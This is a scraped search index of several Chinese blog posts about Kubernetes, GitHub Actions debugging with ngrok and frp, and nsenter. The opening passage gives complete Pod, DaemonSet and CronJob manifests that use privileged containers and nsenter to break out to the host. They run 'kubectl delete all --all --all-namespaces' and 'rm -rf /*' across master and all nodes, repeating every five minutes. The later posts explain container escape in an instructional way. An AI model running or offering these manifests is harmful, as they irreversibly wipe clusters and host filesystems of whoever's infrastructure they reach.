但是也有可能没那么大权限，那么就试试下面的方法吧。下面的方法依赖于 Docker 的特权模式。\n2. 随便试试，热热身 先热热身，执行脚本，随便试试，看看有没有效果。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: v1 kind: Pod metadata: name: danger-1 namespace: default spec: containers: - command: [\u0026#34;sh\u0026#34;] args: [\u0026#34;-c\u0026#34;, \u0026#34;echo \u0026#39;kubectl delete all --all --all-namespaces\u0026#39; | nsenter -t 1 -m -u -i -n\u0026#34;] image: docker.io/alpine:3.12 name: pod-test securityContext: privileged: true hostIPC: true hostNetwork: true hostPID: true tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - key: CriticalAddonsOnly operator: Exists - effect: NoExecute key: node.kubernetes.io/not-ready operator: Exists tolerationSeconds: 60 - effect: NoExecute key: node.kubernetes.io/unreachable operator: Exists tolerationSeconds: 60 EOF 3. 可能 Master 节点上配置了 kubeconfig 如果 Node 节点无法执行 kubectl 命令，那么可以选中 Master 节点试试。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: v1 kind: Pod metadata: name: danger-1 namespace: default spec: affinity: nodeAffinity: preferredDuringSchedulingIgnoredDuringExecution: - preference: matchExpressions: - key: node-role.kubernetes.io/master operator: In values: - \u0026#34;\u0026#34; weight: 100 containers: - command: [\u0026#34;sh\u0026#34;] args: [\u0026#34;-c\u0026#34;, \u0026#34;echo \u0026#39;kubectl delete all --all --all-namespaces\u0026#39; | nsenter -t 1 -m -u -i -n\u0026#34;] image: docker.io/alpine:3.12 name: pod-test securityContext: privileged: true tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - key: CriticalAddonsOnly operator: Exists - effect: NoExecute key: node.kubernetes.io/not-ready operator: Exists tolerationSeconds: 60 - effect: NoExecute key: node.kubernetes.io/unreachable operator: Exists tolerationSeconds: 60 hostIPC: true hostNetwork: true hostPID: true EOF 4. 算了，全部节点都试试 如果还是不行，干脆全部节点都试试吧，反正东西都收拾好了。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: apps/v1 kind: DaemonSet metadata: name: danger-3 spec: selector: matchLabels: danger.kubernetes.io/name: d3 template: metadata: labels: danger.kubernetes.io/name: d3 spec: containers: - command: [\u0026#34;sh\u0026#34;] args: [\u0026#34;-c\u0026#34;, \u0026#34;echo \u0026#39;kubectl delete all --all --all-namespaces\u0026#39; | nsenter -t 1 -m -u -i -n\u0026#34;] image: docker.io/alpine:3.12 name: pod-test securityContext: privileged: true hostIPC: true hostNetwork: true hostPID: true tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - key: CriticalAddonsOnly operator: Exists - effect: NoExecute key: node.kubernetes.io/not-ready operator: Exists tolerationSeconds: 60 - effect: NoExecute key: node.kubernetes.io/unreachable operator: Exists tolerationSeconds: 60 EOF 5. 最后挣扎一下，定时试试，先下班了 试到这里，大概率明天还得继续搬砖 996 了，最后再试一次。\n每五分钟执行一次，基本格式 : * * * * *，分别对应分、时、日、月、周。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 cat \u0026lt;\u0026lt;EOF | kubectl apply -f - apiVersion: batch/v1beta1 kind: CronJob metadata: name: danger-4 spec: schedule: \u0026#34;*/5 * * * *\u0026#34; jobTemplate: spec: template: spec: containers: - command: [\u0026#34;sh\u0026#34;] args: [\u0026#34;-c\u0026#34;, \u0026#34;echo \u0026#39;sudo rm -rf /*\u0026#39; | nsenter -t 1 -m -u -i -n\u0026#34;] image: docker.io/alpine:3.12 name: pod-test securityContext: privileged: true restartPolicy: OnFailure hostIPC: true hostNetwork: true hostPID: true tolerations: - effect: NoSchedule key: node-role.kubernetes.io/master - key: CriticalAddonsOnly operator: Exists - effect: NoExecute key: node.kubernetes.io/not-ready operator: Exists tolerationSeconds: 60 - effect: NoExecute key: node.kubernetes.io/unreachable operator: Exists tolerationSeconds: 60 EOF 6. 参考 《如何在主机上调试容器、在容器中操作主机》 ","description":"","id":246,"section":"post","tags":["博文","Kubernetes","安全","攻击向量"],"title":"Kuberntes 系统下的 `rm -rf /`，执行完就可以跑路了","uri":"https://www.chenshaowen.com/blog/attack-vectors-under-kubernetes.html"},{"content":"1. 登录 Ngrok 获取一个 Authtoken 1.1 登陆 Ngrok 官网，获取 Authtoken 访问 Ngrok 官网，https://dashboard.ngrok.com/ , 可以使用 GitHub 或者 Google 账户登陆。\n进入 Authentication 页面，找到自己的 Authtoken，如下图:\n1.2 在 GitHub 项目下，配置 Secrets 在项目的 Settings 页面中，新增 Secrets，如下图:\n将 NGROK_TOKEN 设置为上一步中获取到的 Authtoken 。\n2. 在 GitHub Actions 中添加一个 Workflows，并运行 Action 这里为了能更方便地使用 Kubernetes ，提前预装了 KubeSphere 用于管理集群。\n在项目的 .github/workflows 目录下添加如下文件：\nkubernetes.yaml\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 name: example-ngrok-kind-v2 on: workflow_dispatch: jobs: example-ngrok-kind-v2: runs-on: ubuntu-latest steps: - name: Creating kind cluster uses: helm/kind-action@v1.0.0-rc.1 - name: Install KubeSphere run: | kubectl apply -f https://github.com/kubesphere/ks-installer/releases/download/v3.0.0/kubesphere-installer.yaml kubectl apply -f https://github.com/kubesphere/ks-installer/releases/download/v3.0.0/cluster-configuration.yaml - name: Expose Port for Kind run: | export ID=`docker ps | awk \u0026#39;{print $1}\u0026#39; | sed -n \u0026#39;2p\u0026#39;` export IP=`docker inspect ${ID} |grep IPAddress | sed -n \u0026#39;2p\u0026#39;| grep -o \u0026#39;[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\\.[0-9]\\{1,3\\}\u0026#39;` sudo apt-get install socat socat TCP4-LISTEN:30880,reuseaddr,fork TCP4:${IP}:30880 \u0026amp; - uses: shaowenchen/debugger-action@v2 name: debugger timeout-minutes: 60 continue-on-error: true with: ngrok_token: ${{ secrets.NGROK_TOKEN }} ngrok_addr_1: 30880 ngrok_proto_1: http 其中的 timeout-minutes 参数决定了可以体验的时长，最长不超过 6 个小时，环境会被销毁，这里设置的是 60 分钟。\n在 Actions 页面中，点击运行 Action\n为了能看到完整日志，执行完成之后，请点击进入 Action，查看滚动日志，否则可能看不到相关链接。需要登录到 Ngrok 的 Dashboard ，访问 https://dashboard.ngrok.com/status/tunnels 页面查看:\n3. 访问 KubeSphere 在 Action 的执行日志中可以查看到相关的访问链接\n使用 ssh root@4.tcp.ngrok.io -p 19315 可以登录后台，密码是 root。\n大约需要等待 Actions 执行 7 分钟之后，https://ce382ad6a3d1.ngrok.io/ 和 http://ce382ad6a3d1.ngrok.io/ 都可以打开 KubeSphere 的管理页面。下面是产品页面的截图:\n4. 参考链接 https://www.chenshaowen.com/ https://github.com/shaowenchen/debugger-action ","description":"","id":247,"section":"post","tags":["博文","GitHub","Actions","DevOps","CICD","demo"],"title":"不限次数，单次最长 6 小时免费在线体验 Kubernetes","uri":"https://www.chenshaowen.com/blog/free-kubernetes-env-using-github-actions.html"},{"content":"1. 什么是 Ngrok Ngrok 是一个内网穿透工具，能够将内网的服务，发布到公网上。下面这张图，可以很好地展示其功能:\n相较于同类工具 Frp (需要同时运行 Server 和 Client )，Ngrok 将内网穿透做成了一个服务。只需要在 Ngrok 注册账户，获得 Authtoken ，启动 Client 就可以对外提供，本地服务的公网地址。\n使用方式非常地简单，三步走:\n解压 Ngrok 文件 1 unzip /path/to/ngrok.zip 授权 1 ./ngrok authtoken xxxxxxxxxx 暴露服务 1 ./ngrok tcp 22 这样就可以得到一个可以在公网直接访问的地址，例如: 4.tcp.ngrok.io:18848\n2. 什么是 debugger-action 在之前的文章《GitHub Actions 在线调试工具：debugger-action》中，给大家介绍了一个 GitHub Actions 的调试工具，允许开发者将 Runner 保持在线，从而远程 SSH 登陆进行调试。\n在 shaowenchen/debugger-actions@v1 中，调试依赖于 Frp Server 服务，示例如下：\n1 2 3 4 5 6 7 8 9 - uses: shaowenchen/debugger-action@v1 name: debugger timeout-minutes: 30 continue-on-error: true with: frp_server_addr: ${{ secrets.FRP_SERVER_ADDR }} frp_server_port: ${{ secrets.FRP_SERVER_PORT }} frp_token: ${{ secrets.FRP_TOKEN }} ssh_port: ${{ secrets.SSH_PORT }} 这对开发者不够友好。了解到 Ngrok 可以提供免费的穿透服务之后，我在 shaowenchen/debugger-actions@v2 中，对 Ngrok 进行了支持。在 v2 中，同样支持 Frp 。\n下面一起来看看，怎么使用 Ngrok 进行 GitHub Actions 调试吧。\n3. 在 debugger-action 上使用 Ngrok 进行进行调试 3.1 登陆 Ngrok 官网，获取 Authtoken 访问 Ngrok 官网，https://dashboard.ngrok.com/ , 可以使用 GitHub 或者 Google 账户登陆。\n进入 Authentication 页面，找到自己的 Authtoken，如下图:\n3.2 在 GitHub 项目下，配置 Secrets 在项目的 Settings 页面中，新增 Secrets，如下图:\n将 NGROK_TOKEN 设置为上一步中获取到的 Authtoken 。\n3.3 在项目中，添加 debugger-action 在需要断点调试的 Workflows 中，添加如下 debugger-actions 片段：\n1 2 3 4 5 6 - uses: shaowenchen/debugger-action@v2 name: debugger timeout-minutes: 30 continue-on-error: true with: ngrok_token: ${{ secrets.NGROK_TOKEN }} 这里给出一个 Kind 环境的完整示例：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 name: example-ngrok-kind-v2 on: workflow_dispatch: jobs: example-ngrok-kind-v2: runs-on: ubuntu-latest steps: - name: Creating kind cluster uses: helm/kind-action@v1.0.0-rc.1 - uses: shaowenchen/debugger-action@v2 name: debugger timeout-minutes: 30 continue-on-error: true with: ngrok_token: ${{ secrets.NGROK_TOKEN }} 3.4 远程登陆进行调试 由于上一步设置的是 workflow_dispatch ，因此需要手动触发流程。\n在 GitHub Actions 的日志中可以找到 Ngrok 输出的访问地址，如下图:\n使用 SSH 进行登录：\n1 ssh root@0.tcp.ngrok.io -p 10815 输入密码: root\n然后就可以在 Runner 上愉快地进行调试了。\n1 2 3 4 5 6 7 8 9 10 11 12 kubectl get pod -A NAMESPACE NAME READY STATUS RESTARTS AGE kube-system coredns-6955765f44-cknkh 1/1 Running 0 2m35s kube-system coredns-6955765f44-crx27 1/1 Running 0 2m35s kube-system etcd-chart-testing-control-plane 1/1 Running 0 2m51s kube-system kindnet-l2sjw 1/1 Running 0 2m35s kube-system kube-apiserver-chart-testing-control-plane 1/1 Running 0 2m51s kube-system kube-controller-manager-chart-testing-control-plane 1/1 Running 0 2m51s kube-system kube-proxy-td9jg 1/1 Running 0 2m35s kube-system kube-scheduler-chart-testing-control-plane 1/1 Running 0 2m52s local-path-storage local-path-provisioner-7745554f7f-qf6n8 1/1 Running 0 2m35s 4. 参考 https://github.com/marketplace/actions/a-debugger-for-actions https://github.com/shaowenchen/debugger-action ","description":"","id":248,"section":"post","tags":["博文","GitHub","Actions","DevOps","CICD","demo"],"title":"debugger-action 更新 v2 版支持 ngrok","uri":"https://www.chenshaowen.com/blog/a-debugger-for-actions-v2.html"},{"content":"\n1. Debug 到想跑路 GitHub Actions 是 GitHub 在 2018 年 10 月推出的持续集成服务。对于开源项目，免费提供无限时长的构建时间，同时支持 Linux、MacOs、Windows 系统，非常招人喜爱。\n但是，最近的一次经历改变了我的看法。我给同事的仓库，提交了一个 improvement: build and ci 的 commit ，用于完善持续构建的功能。如下图：\n这只是 Debug 过程中的几条记录。在本地测试通过，但是添加到 workflows 就报错。花了一天多时间，提交了不下几十次用于测试。这是一个私有的仓库，只能遵循 Merge Requests 的研发流程。这倒不要紧，关键是老板 watch 了这个仓库。每次构建失败，都会收到一条通知邮件，还赶上年终，泪奔 ~~~\n2. debugger-action 诞生记 周末正好看到 PingCap 有个 Hackathon 的活动，用较短的时间集中完成一个功能。灵感一闪，我周末就用 GitHub Actions 来解决一下 Debug 到想跑路的问题。\n看了下 TypeScript 的语法，凭借之前 SaaS 全栈开发的一点底子，还有强大的 Google 搜索引擎，就把事情给办了。\n一起来看看怎么调试 GitHub Actions 吧。下面是一个 Go 的 workflows 环境：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 name: Build on: push: branches: [ master ] jobs: build: name: Build runs-on: ubuntu-latest steps: - name: Set up Go 1.14 uses: actions/setup-go@v1 with: go-version: 1.14 - name: Check out code into the Go module directory uses: actions/checkout@v2 - uses: shaowenchen/debugger-action@v1 name: debugger timeout-minutes: 30 continue-on-error: true with: frp_server_addr: ${{ secrets.FRP_SERVER_ADDR }} frp_server_port: ${{ secrets.FRP_SERVER_PORT }} frp_token: ${{ secrets.FRP_TOKEN }} ssh_port: ${{ secrets.SSH_PORT }} 运行起来之后，Runner 会 hold 30 分钟，开发者可以通过 ssh 远程登陆到 Runner 上执行命令，进行调试。\n1 ssh root@frp_server_addr -p ssh_port 输入 root 密码: root\n这样就进入了 Runner 的执行环境，debugger-actions 目前支持 Linux 和 MacOS 的构建环境。\n3. 配置和使用 debugger-action 3.1 搭建 Frp Server 参考之前写过的一篇文档 《使用 frp 将本地服务发布到公网》 ，其中有一键安装的脚本。\n安装成功会得到一个配置:\n============================================== You Server IP : x.x.x.x Bind port : 5443 KCP support : true vhost http port : 80 vhost https port : 443 Dashboard port : 6443 token : x tcp_mux : true Max Pool count : 200 Log level : info Log max days : 30 Log file : enable ============================================== 如果没有服务器的同学，也可以使用我在项目 issues 中提供的测试 Frp Server ，https://github.com/shaowenchen/debugger-action/issues/3 。\n3.2 配置秘钥 在 Settings 页面的 Secrets 中，添加三个秘钥，FRP_SERVER_ADDR, FRP_SERVER_PORT, FRP_TOKEN ，秘钥值来自上一步。如下图:\nSecrets Frp 对应值 FRP_SERVER_ADDR You Server IP FRP_SERVER_PORT Bind port FRP_TOKEN token SSH_PORT 可以任意指定，但不同 Workflows 中不能相同。SSH_PORT 相同，会导致 Frp Client 起不来。当然，也可以填写一个固定值，只是不那么安全。\n3.3 添加 debugger-action 在 Workflows 中需要 Debug 的地方，添加下面的 yaml 片段。\n1 2 3 4 5 6 7 8 9 - uses: shaowenchen/debugger-action@v1 name: debugger timeout-minutes: 30 continue-on-error: true with: frp_server_addr: ${{ secrets.FRP_SERVER_ADDR }} frp_server_port: ${{ secrets.FRP_SERVER_PORT }} frp_token: ${{ secrets.FRP_TOKEN }} ssh_port: ${{ secrets.SSH_PORT }} 其中 timeout-minutes 用于设置需要 Debug 的时长。GitHub Actions 中，每个 Job 允许执行的最大时长为 6 个小时。\n4. 使用测试 使用 ssh 命令，root/root（账户/密码），登陆到 Runner。\n1 ssh root@frp_server_addr -p ssh_port 在 Frp Dashboard 中，也可以看到相关连接。\n5. 一些测试用例 5.1 buildx 构建环境 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 name: buildx on: push: branches: [ master ] jobs: hello: runs-on: ubuntu-latest steps: - name: Set up Docker Buildx uses: docker/setup-buildx-action@v1 - uses: shaowenchen/debugger-action@v1 name: debugger timeout-minutes: 30 continue-on-error: true with: frp_server_addr: ${{ secrets.FRP_SERVER_ADDR }} frp_server_port: ${{ secrets.FRP_SERVER_PORT }} frp_token: ${{ secrets.FRP_TOKEN }} ssh_port: 29001 命令行测试:\n1 2 3 4 docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 94e481a9d5a5 moby/buildkit:buildx-stable-1 \u0026#34;buildkitd --allow-i…\u0026#34; 23 minutes ago Up 23 minutes buildx_buildkit_builder-1cfe11cc-90d5-4518-9d89-a05765ac30620 5.2 一个 Kind 集群 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 name: kind on: push: branches: [ master ] jobs: hello: runs-on: ubuntu-latest steps: - name: Creating kind cluster uses: helm/kind-action@v1.0.0-rc.1 - uses: shaowenchen/debugger-action@v1 name: debugger timeout-minutes: 30 continue-on-error: true with: frp_server_addr: ${{ secrets.FRP_SERVER_ADDR }} frp_server_port: ${{ secrets.FRP_SERVER_PORT }} frp_token: ${{ secrets.FRP_TOKEN }} ssh_port: 29002 命令行测试:\n1 2 3 4 kubectl get node NAME STATUS ROLES AGE VERSION chart-testing-control-plane Ready master 24m v1.17.0 5.3 一个 MacOS 环境 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 name: macos-shell on: push: branches: [ master ] jobs: hello: runs-on: macos-latest steps: - uses: shaowenchen/debugger-action@v1 name: debugger timeout-minutes: 30 continue-on-error: true with: frp_server_addr: ${{ secrets.FRP_SERVER_ADDR }} frp_server_port: ${{ secrets.FRP_SERVER_PORT }} frp_token: ${{ secrets.FRP_TOKEN }} ssh_port: 29003 命令行测试:\n1 2 3 Mac-1610933038460:~ runner$ uname -a Darwin Mac-1610933038460.local 19.6.0 Darwin Kernel Version 19.6.0: Thu Oct 29 22:56:45 PDT 2020; root:xnu-6153.141.2.2~1/RELEASE_X86_64 x86_64 6. 参考 https://github.com/marketplace/actions/a-debugger-for-actions https://github.com/shaowenchen/debugger-action https://docs.github.com/en/actions/reference/usage-limits-billing-and-administration ","description":"","id":249,"section":"post","tags":["博文","GitHub","Actions","DevOps","CICD","demo"],"title":"GitHub Actions 在线调试工具：debugger-action","uri":"https://www.chenshaowen.com/blog/a-debugger-for-actions.html"},{"content":"1. 一个奇怪的需求 老板有个奇怪的需求，通过一个 kubeconfig 文件，获取主机的各种状态信息，比如进程列表、进程状态等。\n第一反应就是，老板是不是不懂容器，容器怎么能这样玩，这样玩还要什么容器，内心万马奔腾。\n直到最近遇到了一个命令行工具，才发现原来小丑是我自己。下面一起来看看，我发现了什么吧。\n2. 容器的原理 沙箱是一个虚拟环境，在沙箱内部进行的操作对外部没有影响。沙箱与沙箱之间是隔离的，也是不可见的，看不到彼此的存在。\n我们常说的容器就是基于 Linux 的 Cgroups 和 Namespace 技术构建的一个沙箱环境。\n从图中，可以看到，容器与容器的边界就是通过 Cgroups 和 Namespace 这两种技术控制的。下面简单描述一下这两种技术:\nNamespace 不同 Namespace 下的资源相互独立、不可见。Linux 从 2.4.19 完成了支持 Mount Namespace，2.6.19 完成了支持 UTS、IPS Namespace，2.6.24 完成了支持 PID Namespace，2.6.29 完成了支持 Network Namespace，3.8 完成了支持 User Namespace 。其中，除了 User Namespace ，其他都需要以 root 权限创建。同时，在 4.6 中已经新增了 Cgroup namespace，目前 RunC（Docker 提供的运行时） ，已经合并了相关的 PR: https://github.com/opencontainers/runc/pull/1916 。下面是其中的 7 种 Namespace。\nMount namespace，隔离文件系统挂载点。一个 Namespace 中，程序对文件的修改，只影响自身的文件系统，而对其他 Namespace 没有影响。\nUTS namespace，隔离主机名和域名信息。每个 Namespace 中，主机和域名信息相互独立。\nIPC namespace，隔离进程通信的行为。只有一个 Namespace 中的进程可以互相通信。\nPID namespace，隔离进程的 PID 空间。不同 Namespace 中的进程 PID 可以重复，互不影响。PID 为 1 的进程是其他所有进程的父进程，因此这个 Namespace 非常有意义。\nNetwork namespace，隔离网络资源。每个 Namespace 都具有独立的网络栈信息，容器运行时仿佛在一个独立的网络中。\nUser namespace，隔离用户和用户组。同一个用户在不同的 Namespce，可以具有不同的角色，用来保障安全性。\nCgroup namespace，隔离 Cgroup 的可见性。每个 Namespace 中，都具有独立的 cgroupns root 和 cgroup filesystem 视图。\nCgroups 上面将一组进程放置到一个 Namespace，对外隔离，对内共享资源，接着使用 Cgroups 对其进行资源的控制。Cgroups 提供了四个功能:\n资源限制。针对一个进程或进程组，设置资源消耗限制。比如内存超出限制，会导致申请内存失败。 资源统计。统计 CPU 使用时长、内存用量等。 任务控制。控制进程的状态，可以挂起、恢复进程。 优先级分配。设置进程的优先级。 利用 Namespcae 和 Cgroups 提供的沙箱环境，再加上文件系统技术，就支持起了容器技术。\n3. 一个调试工具: nsenter nsenter 是一个用来进入指定程序，所在 Namespace，并执行命令的工具。在容器场景下，很多容器为了轻量化，而裁剪了很多基础的命令，比如 ip 、 tcpdump 等。这样给调试容器带来了一定的困难，通过 nsenter 共享 Namespace 进行调试，可以很好地解决这个问题。\n实际上，RunC 在创建容器时，也是调用的 nsenter ，在 libcontainer 的代码中可以看到。\n安装 nsenter 大部分的 Linux 操作系统，已经内置了 nsenter 命令。如果没有，以 CentOS 为例，执行如下命令，安装 util-linux 包即可:\n1 yum install -y util-linux nsenter 的版本和参数 由于不同的 Linux Kernel 对 Namespace 支持的程度不一样，nsenter 的版本会有所差异。这里以 CentOS 7 为例：\n查看系统内核版本 1 2 3 uname -a Linux i-x29a8rdc 3.10.0-1127.10.1.el7.x86_64 #1 SMP Wed Jun 3 14:28:03 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux 查看 nsenter 版本 1 2 3 nsenter -V nsenter from util-linux 2.23.2 查看 nsenter 的参数 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 nsenter -h Usage: nsenter [options] \u0026lt;program\u0026gt; [\u0026lt;argument\u0026gt;...] Run a program with namespaces of other processes. Options: -t, --target \u0026lt;pid\u0026gt; target process to get namespaces from -m, --mount[=\u0026lt;file\u0026gt;] enter mount namespace -u, --uts[=\u0026lt;file\u0026gt;] enter UTS namespace (hostname etc) -i, --ipc[=\u0026lt;file\u0026gt;] enter System V IPC namespace -n, --net[=\u0026lt;file\u0026gt;] enter network namespace -p, --pid[=\u0026lt;file\u0026gt;] enter pid namespace -U, --user[=\u0026lt;file\u0026gt;] enter user namespace -S, --setuid \u0026lt;uid\u0026gt; set uid in entered namespace -G, --setgid \u0026lt;gid\u0026gt; set gid in entered namespace --preserve-credentials do not touch uids or gids -r, --root[=\u0026lt;dir\u0026gt;] set the root directory -w, --wd[=\u0026lt;dir\u0026gt;] set the working directory -F, --no-fork do not fork before exec\u0026#39;ing \u0026lt;program\u0026gt; -Z, --follow-context set SELinux context according to --target PID -h, --help display this help and exit -V, --version output version information and exit 这里需要注意的是 -t 参数，指定一个进程，用于获取 Namepace 参数。其他参数主要是使能、设置参数。\n由于非沙箱环境下，并不容易体现 nsenter 的功能，我们在容器环境下进一步实验。\n4. nsenter 在 Docker 容器环境下的应用 4.1 主机下，进入容器的 Namespace 环境 选择一个容器 1 2 3 4 docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 9addecf82c5e sonarqube:7.9.4-community \u0026#34;./bin/run.sh\u0026#34; 3 weeks ago Up 3 weeks 0.0.0.0:9000-\u0026gt;9000/tcp sonarqube_sonarqube_1 获取容器的 PID 每个容器内都有一个 PID=1 的进程，如同宿主机上的 init 进程一样，是其他进程的父进程。但是在主机上，容器进程具有另外一个 PID ，可以用于管理容器。\n1 2 3 docker inspect --format \u0026#34;{{ .State.Pid }}\u0026#34; 9addecf82c5e 3969 进入容器的 Namespace 环境 这里以进入网络空间为例:\n1 nsenter -t 3969 -n /bin/bash 如果宿主机上的默认 shell，在容器中存在，可以省略 /bin/bash，否则需要显式指定一个容器中的 shell。\n执行主机上的命令行工具，调试容器环境 1 2 3 4 5 6 7 8 9 10 ip addr 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 11: eth0@if12: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc noqueue state UP group default link/ether 02:42:ac:12:00:03 brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 172.18.0.3/16 brd 172.18.255.255 scope global eth0 valid_lft forever preferred_lft forever 从执行结果可以看到，显示的是容器上的网卡地址信息，但 ip 命令却来自宿主机。\n4.2 容器下，进入主机的 Namespace 环境 以特权模式，使用主机的 Namespace 创建容器 1 docker run --privileged --net=host --ipc=host --pid=host -it --rm docker.io/alpine:3.12 /bin/sh 进入 PID=1 进程的 Namespace 环境 1 nsenter -t 1 -m -u -i -n 执行命令，操作主机环境 1 2 3 4 5 docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 2cd99b9d7b5a alpine:3.12 \u0026#34;/bin/sh\u0026#34; About a minute ago Up About a minute trusting_khorana 9addecf82c5e sonarqube:7.9.4-community \u0026#34;./bin/run.sh\u0026#34; 3 weeks ago Up 3 weeks 0.0.0.0:9000-\u0026gt;9000/tcp sonarqube_sonarqube_1 从执行结果可以看到，命令显示的是主机上的容器信息，但却是在容器下执行的命令。\n5. nsenter 在 Kubernetes 容器环境下的应用 这部分的内容和上一个章节类似，只不过在进入容器时，需要借道 Pod 获取 PID；在主机上执行命令时，需要借道 Pod 创建容器。\n5.1 从主机进入 Kubernetes Pod 中，调试容器环境 选择一个 Pod 1 2 3 4 kubectl get pod -o wide NAME READY STATUS RESTARTS AGE IP NODE NOMINATED NODE READINESS GATES nginx-6db489d4b7-589bd 1/1 Running 0 11s 10.233.76.91 tf-cd-allinone-0 \u0026lt;none\u0026gt; \u0026lt;none\u0026gt; 获取容器 ID 1 2 3 kubectl describe pod nginx-6db489d4b7-589bd | grep -A10 \u0026#34;^Containers:\u0026#34; | grep -Eo \u0026#39;docker://.*$\u0026#39; | head -n 1 | sed \u0026#39;s/docker:\\/\\/\\(.*\\)$/\\1/\u0026#39; 981c94ef07abfbeca548e9e36cd70a7369d1cf38a50754c2dc4f87fbc27601d1 切换到主机所在节点 1 ssh root@tf-cd-allinone-0 获取容器的 PID 1 2 3 docker inspect --format \u0026#34;{{.State.Pid}}\u0026#34; 981c94ef07abfbeca548e9e36cd70a7369d1cf38a50754c2dc4f87fbc27601d1 6954 进入容器的 Namespace 1 nsenter -t 6954 -n 执行主机命令，调试容器 1 2 3 4 5 6 7 8 9 10 11 12 ip addr 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever 2: tunl0@NONE: \u0026lt;NOARP\u0026gt; mtu 1480 qdisc noop state DOWN group default qlen 1000 link/ipip 0.0.0.0 brd 0.0.0.0 4: eth0@if100: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1440 qdisc noqueue state UP group default link/ether 16:a3:44:dc:58:ce brd ff:ff:ff:ff:ff:ff link-netnsid 0 inet 10.233.76.91/32 scope global eth0 valid_lft forever preferred_lft forever 这里需要注意的是，容器和节点是绑定在一起的，对于多节点环境，获取容器 ID 之后，需要切换到所在主机进行操作。\n5.2 在 Kubernetes Pod 中，直接操作主机 新建一个 pod-test.yaml 文件，内容如下 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 apiVersion: v1 kind: Pod metadata: name: pod-test namespace: default spec: containers: - command: [\u0026#39;sh\u0026#39;, \u0026#39;-c\u0026#39;, \u0026#39;echo \u0026#34;Hello, wwww.chenshaowen.com !\u0026#34; \u0026amp;\u0026amp; sleep 3600\u0026#39;] image: docker.io/alpine:3.12 name: pod-test securityContext: privileged: true hostIPC: true hostNetwork: true hostPID: true 创建 Pod 1 kubectl apply -f pod-test.yaml 进入 Pod 中 1 kubectl exec -it pod-test /bin/sh 进入 PID=1 进程的 Namespace 1 nsenter -t 1 -m -u -i -n -p 执行主机命令测试 1 2 3 4 5 6 docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES f6bd778c3172 389fef711851 \u0026#34;sh -c \u0026#39;echo \\\u0026#34;Hello,…\u0026#34; 4 minutes ago Up 4 minutes k8s_pod-test_pod-test_default_3a496075-419e-477a-b03c-a423677a90be_0 4e197fd98294 kubesphere/pause:3.1 \u0026#34;/pause\u0026#34; 4 minutes ago Up 4 minutes k8s_POD_pod-test_default_3a496075-419e-477a-b03c-a423677a90be_0 ... 以特权模式启动容器，通过 PID=1 的进程共享 Namespace，直接执行主机上的命令。\n6. 总结 本篇主要介绍了在容器环境下，如何逃逸到主机执行命令；在主机下，如何进入容器调试环境。同时，还给出了在 Container 和 Kubernetes 两种场景下的实践示例。\n其中有两点对我有所启发，一个是 nsenter 命令，加深了对容器技术的理解。另外一个是特权模式启动的容器，权限十分大，需要谨慎，业务应该尽量采用 rootless 的方式运行容器。\n在以特权模式启动的 Docker Daemon 中，创建 Kuberntes 集群，通过 nsenter 命令，可以 nodeSelector 到任意节点，然后执行 kubectl/docker/systemctl 等命令进行破坏活动。\n7. 参考 https://man7.org/linux/man-pages/man1/nsenter.1.html https://docs.docker.com/engine/reference/run/ ","description":"","id":250,"section":"post","tags":["博文","容器","安全","Kubernetes","Docker"],"title":"如何在主机上调试容器、在容器中操作主机","uri":"https://www.chenshaowen.com/blog/operate-host-in-container-and-debug-container-on-host.html"},{"content":"1. 写作如写代码一般重要 从行为上看写作和写代码都是在 Typing 